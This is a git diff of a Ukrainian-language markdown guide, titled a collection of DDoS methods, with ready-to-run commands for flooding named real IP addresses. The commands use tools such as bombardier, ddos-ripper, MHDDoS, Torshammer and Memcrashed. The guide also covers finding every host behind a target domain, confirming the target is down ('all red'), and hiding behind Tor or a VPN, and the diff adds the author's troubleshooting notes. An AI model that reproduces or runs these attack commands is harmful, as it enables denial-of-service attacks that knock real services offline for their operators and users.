@@ -1,7 +1,16 @@
 # Збірка DDoS методів
 
+# Туторіали про DDoS
+- https://docs.google.com/document/d/18nxvjQuHpAgrJ-t9S9CJ9dPK9_z0F73UrBpBFn7ZyVo/edit
+- https://tarahtino.notion.site/tarahtino/DDoS-1505b74f6f8443768dc47e0f4d2ee8b2
 
-## Провірка
+
+## Як провірити чи сайт "впав" остаточно
+
+Справ в тому, що один сайт по домену за собою може мати багато хостів (репліки, лоад балансінг), і тому "завалити" сайт, значить завалити всі його хости по ІП адресах. І тому простий `ping google.com` або `ping google.com -s 2048` не навантажить хост і точно не всі інші хости якось сильно зачепить. PING для google.com показує ІП адресу 216.58.208.174 і так її можна взнати. Але наприклад `ping gazeta.ru` => `PING gazeta.ru (81.19.72.2): 56 data bytes` а ІП адрес є аж 6 (81.19.72.0 - 81.19.72.5).
+
+На сайті https://dnschecker.org/ - можна звірити які саме ІП адреси відносяться до певного домену (сайту якого ви таргетуєте).
+
 
 **ping** метод (відкривати в Tor Browser або в будь-якому якщо є окрмеий VPN).
 
@@ -10,6 +19,8 @@
 ```
 https://port.ping.pe/194.54.14.186:53
 ```
+*АКТУАЛЬНІ ПИТАННЯ*:
+- Префікс на сторінці пише TCP port check, але порт може бути вписани як і 80 (HTTP) так і 443 (HTTPS). Але [тут](https://en.wikipedia.org/wiki/List_of_TCP_and_UDP_port_numbers) пише, що і 22 (для `ssh`) і 53 (для DNS) є портами як TCP так і UDP. Треба тільки це підтвердити на тестах.
 
 Клікнути на ОК, і чекати поки інфо рефрешнеться про всі репліки. Ціль - ВСІ ЧЕРВОНІ
 
@@ -18,6 +29,9 @@ https://port.ping.pe/194.54.14.186:53
 ```
 https://check-host.net/check-udp?host=194.54.14.187
 ```
+
+*АКТУАЛЬНІ ПИТАННЯ*: 
+- чи треба вписувати порт 53 якщо провіряєтсья UDP?
 
 
 ## DDoS-имо з Docker-ом
@@ -31,6 +45,10 @@ https://hub.docker.com/r/alpine/bombardier
 ```
 docker run -ti --rm alpine/bombardier -c 10000 -d 3600s -l 194.54.14.186:53/UDP
 ```
+
+*АКТУАЛЬНІ ПИТАННЯ*: 
+- так треба `/UDP` чи `/TCP` для портів 22 чи 53 в кінці? Чи можна міксувати протоколи і порти з цими суфіксами? Чому люди міксують? 
+- І взагалі пишуть, що bombardier не працює з TCP/UDP. Треба провірити хелп.
 
 **Docker** метод 2 (треба VPN) - TBD
 
@@ -61,6 +79,9 @@ brew install --cask docker
 docker run --rm -it nitupkcuf/ddos-ripper:latest {HOSTNAME | IP}
 ```
 
+*АКТУАЛЬНІ ПИТАННЯ*: 
+- Треба нормально заінсталити і запустити (бо докер тут ставиться через `cask`)
+
 **MHDDoS** PYTHON (тільки 3) метод (треба VPN)
 
 https://github.com/MHProDev/MHDDoS
@@ -75,6 +96,8 @@ python3 start.py udp 194.54.14.186:53 1000 3600
 Норм якщо ви бачите "Attack Started !"
 Але в мене на іншому компі депси не проінсталиись. рестартував. хз.
 
+*АКТУАЛЬНІ ПИТАННЯ*: 
+- Пару раз в мене запустилось, але потім щось пішло не так (потенційно pip vs. pip3).
 
 **Tors Hammer**
 
@@ -92,9 +115,9 @@ cd Torshammer\ 1.0
 Posting: щось там....
 і connected to host...
 
+*АКТУАЛЬНІ ПИТАННЯ*: 
+- Спочатку працювало для більшості хостів, а потім як я заінсталив через піп3 депенденсіс для MHDDoS то щось пішло не так.
 
-
-# TODO
 
 **Memcrashed** Python + Docker
 
@@ -110,10 +133,10 @@ docker run -it memcrashed
 ```
 Але вимагає ключа для Schodan АПІ => https://www.shodan.io/
 
+*АКТУАЛЬНІ ПИТАННЯ*: 
+- Якось отримати ключ і спробувати. Може має сенс.
 
-# Туторіали про DDoS
-- https://tarahtino.notion.site/tarahtino/DDoS-1505b74f6f8443768dc47e0f4d2ee8b2
-- https://docs.google.com/document/d/18nxvjQuHpAgrJ-t9S9CJ9dPK9_z0F73UrBpBFn7ZyVo/edit
+
 
 # VPN 
 
